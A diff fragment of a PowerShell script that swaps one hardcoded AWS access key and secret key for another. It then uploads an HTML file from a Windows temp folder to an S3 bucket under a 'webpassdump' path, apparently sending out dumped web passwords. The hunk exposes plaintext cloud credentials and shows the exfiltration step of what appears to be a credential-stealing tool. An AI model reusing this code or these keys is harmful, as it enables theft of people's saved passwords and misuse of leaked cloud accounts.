@@ -72,6 +72,6 @@ Rename-Item -Path "C:\Windows\Temp\JuansFamousFriedChicken\password" -NewName "$
 #Importing AWS Powershell Module to current sesssion
 Import-Module -Name AWS.Tools.S3
 #Setup Credential for cloud storage AWS S3
-Set-AWSCredential -AccessKey AKIAV6ZQELF5MMNU2VM3 -SecretKey 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 -StoreAs default
+Set-AWSCredential -AccessKey AKIAV6ZQELF5ADIC4QXW -SecretKey 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 -StoreAs default
 Get-S3Bucket  -BucketName rmmoutputs
 Write-S3Object -BucketName "rmmoutputs" -Key "$File.html" -File "C:\Windows\Temp\JuansFamousFriedChicken\$File.html" -EndpointUrl "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" -Region "us-east-1"
